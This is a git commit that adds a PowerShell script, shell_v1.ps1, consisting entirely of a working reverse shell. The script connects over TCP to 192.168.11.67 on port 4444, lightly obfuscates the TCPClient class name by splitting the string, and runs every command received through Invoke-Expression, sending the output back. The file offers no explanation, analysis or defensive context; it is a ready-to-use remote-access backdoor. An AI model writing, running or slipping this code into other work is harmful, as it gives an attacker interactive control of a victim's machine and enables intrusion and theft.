c3eb4cd3fb91392673bf086f8d83bb6182ec7a36
B15cu1t <141248562+B15cu1t@users.noreply.github.com>
2026-03-17 21:08:06 +0100

    Update shell_v1.ps1

--- shell_v1.ps1
+++ shell_v1.ps1
@@ -1,1 +1,22 @@
+$a = "System.Net.Sockets."
+$b = "TCPClient"
+$c = New-Object ($a + $b)("192.168.11.67", 4444)
+$s = $c.GetStream()
 
+[byte[]]$b_arr = 0..65535|%{0}
+$m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> ")
+$s.Write($m,0,$m.Length)
+
+while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
+    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i)
+    try { 
+        $sb = (Invoke-Expression $d 2>&1 | Out-String) 
+    } catch { 
+        $sb = $_.Exception.Message 
+    }
+    $out = $sb + "PS " + (pwd).Path + "> "
+    $m = ([text.encoding]::ASCII).GetBytes($out)
+    $s.Write($m,0,$m.Length)
+    $s.Flush()
+}
+$c.Close()
